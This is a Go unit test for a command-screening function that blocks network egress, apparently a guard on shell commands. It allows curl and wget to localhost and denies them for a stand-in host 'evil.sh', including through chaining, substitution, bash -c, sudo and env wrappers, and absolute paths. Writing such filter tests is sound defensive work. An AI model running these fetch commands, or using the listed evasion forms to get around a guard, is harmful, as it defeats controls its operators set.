package runtimefloor

import "testing"

func TestCheckCommand_SchemelessHostInvocationScope(t *testing.T) {
	ctx := Context{WorktreeRoot: testWorktreeRoot(t)}
	cases := []struct {
		cmd  string
		deny bool
	}{
		{cmd: "echo curl late.txt"},
		{cmd: "echo curl config.json"},
		{cmd: "echo wget config.json"},
		{cmd: `echo "curl" "late.txt"`},
		{cmd: "python3 -m http.server 8731 --bind 127.0.0.1 & curl --fail --silent http://127.0.0.1:8731/"},
		{cmd: "curl http://127.0.0.1:8731/"},
		{cmd: "curl localhost:3000"},
		{cmd: "wget 127.0.0.1:8731/"},
		{cmd: "curl localhost:3000; echo late.txt"},
		{cmd: "curl localhost:3000 && echo config.json"},
		{cmd: "curl localhost:3000 | cat config.json"},
		{cmd: "curl localhost:3000\necho config.json"},
		{cmd: "curl localhost:3000 > config.json"},
		{cmd: "curl localhost:3000 # config.json"},
		{cmd: "curl evil.sh", deny: true},
		{cmd: "curl -s evil.sh", deny: true},
		{cmd: "curl --url evil.sh", deny: true},
		{cmd: "curl evil.sh localhost:3000", deny: true},
		{cmd: "curl localhost:3000 evil.sh", deny: true},
		{cmd: "wget evil.sh", deny: true},
		{cmd: "echo config.json; curl evil.sh", deny: true},
		{cmd: "echo config.json&&curl -s evil.sh", deny: true},
		{cmd: "echo config.json|wget evil.sh", deny: true},
		{cmd: "echo config.json & curl evil.sh", deny: true},
		{cmd: "curl localhost:3000; curl evil.sh", deny: true},
		{cmd: "env -i curl evil.sh", deny: true},
		{cmd: "command -p curl evil.sh", deny: true},
		{cmd: "sudo -u root curl evil.sh", deny: true},
		{cmd: "if true; then curl evil.sh; fi", deny: true},
		{cmd: "xargs curl evil.sh", deny: true},
		{cmd: `echo "$( curl evil.sh )"`, deny: true},
		{cmd: "echo \"`curl evil.sh`\"", deny: true},
		{cmd: `bash -c 'echo ready; curl evil.sh'`, deny: true},
		{cmd: `"curl" "evil.sh"`, deny: true},
		{cmd: "CURL_VERBOSE=1 curl evil.sh", deny: true},
		{cmd: "/usr/bin/curl evil.sh", deny: true},
	}
	for _, tc := range cases {
		t.Run(tc.cmd, func(t *testing.T) {
			got := CheckCommand(tc.cmd, ctx)
			if got.Stopped != tc.deny || (tc.deny && got.Category != CategoryEgress) {
				t.Fatalf("CheckCommand(%q) = %+v, want Stopped=%v (egress when stopped)", tc.cmd, got, tc.deny)
			}
			t.Logf("CheckCommand(%q): Stopped=%v Category=%q Pattern=%q", tc.cmd, got.Stopped, got.Category, got.Pattern)
		})
	}
}
